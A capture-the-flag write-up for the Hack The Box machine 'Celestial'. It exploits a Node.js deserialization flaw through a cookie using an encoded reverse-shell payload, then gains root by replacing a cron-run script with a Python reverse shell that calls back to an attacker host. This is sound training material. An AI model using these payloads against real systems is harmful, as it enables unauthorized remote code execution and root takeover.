+++
date = '2025-04-11T10:54:25-05:00'
draft = false
title = 'HtB - Celestial'
tags = ['writeup', 'hackthebox', 'medium', 'linux']
hideToc = false
+++
![HtB-Celestial](/images/Celestial.png)

Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects in NodeJS framework.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/celestial]
└─$ nmap -T4 -p- -A 10.129.228.94
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn\'t have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
```

### HTTP - 3000/tcp

![celestial1](/images/celestial1.png)

Can't fuzz much on the website, but a look at the headers reveals a cookie is set.

```sh
┌──(pl4stic㉿kali)-[~/htb/celestial]
└─$ curl http://10.129.228.94:3000/ -i
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Mon, 03 Mar 2025 02:24:57 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Date: Mon, 03 Mar 2025 02:09:57 GMT
Connection: keep-alive
```

Cookie Value: `{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}`

## Initial Access

### SSTI

Messing with the cookie values, it appears as if when we change the `num` value to `1`, the website changes and says: "Hey Dummy 1 + 1 is 11". The website is taking cookie values and generating dynamic content. Maybe we can do an injection of some sort here.

After playing with a few payloads, I see an actual computation on an SSTI payload:
`{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"{{7*7}}"}`

![celestial2](/images/celestial2.png)

### Deserialization

I wasn't getting anywhere with the SSTI approach, so continued my research into NodeJS and the Express framework. During my research, I came across an interesting [deserialization attack](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) that might be applicable here.

Download your [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) and generate your reverse shell script:

```sh
┌──(pl4stic㉿kali)-[~/htb/celestial]
└─$ python2.7 nodejsshell.py 10.10.14.142 4444
[+] LHOST = 10.10.14.142
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,52,50,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Now generate your serialized payload, base64 encode it, and replace the cookie value.

```json
{"rce":"_$$ND_FUNC$$_ function (){<<Paste Encoding>>}()"}
```

```sh
┌──(pl4stic㉿kali)-[~/htb/celestial]
└─$ nc -nvlp 4444                   
listening on [any] 4444 ...
connect to [10.10.14.142] from (UNKNOWN) [10.129.228.94] 50644
Connected!
whoami
sun
```

Grab the `user.txt` and let's move on.

## Privilege Escalation

### linpeas.sh

Easy, probably unintended routes:
```sh
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                               
[+] [CVE-2017-16995] eBPF_verifier
[+] [CVE-2016-8655] chocobo_root
[+] [CVE-2016-5195] dirtycow
[+] [CVE-2016-5195] dirtycow 2
[+] [CVE-2021-4034] PwnKit
[+] [CVE-2021-3156] sudo Baron Samedit 2
[+] [CVE-2017-7308] af_packet
[+] [CVE-2017-6074] dccp
[+] [CVE-2017-1000112] NETIF_F_UFO
[+] [CVE-2016-4557] double-fdput()
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
[+] [CVE-2022-2586] nft_object UAF
[+] [CVE-2021-3156] sudo Baron Samedit
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
[+] [CVE-2019-18634] sudo pwfeedback
[+] [CVE-2019-15666] XFRM_UAF
[+] [CVE-2018-1000001] RationalLove
[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64
[+] [CVE-2017-1000253] PIE_stack_corruption
[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE
[+] [CVE-2016-2384] usb-midi
[+] [CVE-2016-0728] keyring
```

### Cron Job

Notice that the file `/home/sun/output.txt` is very recently updated, and seems to be updated every ~5 minutes or so.  Further enumeration yields a python script at `/home/sun/Documents/script.py` that, based on the code, is likely generating that output file. Oh, by the way, the `output.txt` is owned by `root`. I wonder if it's a cron job?

We have write permissions for `script.py`, so let's replace it with a nice reverse shell and setup a listener to see what happens.

```python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.142",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

I transferred this over via HTTP to replace `script.py`.

```sh
┌──(pl4stic㉿kali)-[~/htb/celestial]
└─$ nc -nvlp 5555                      
listening on [any] 5555 ...
connect to [10.10.14.142] from (UNKNOWN) [10.129.228.94] 46914
# whoami
whoami
root
```

Now grab `root.txt`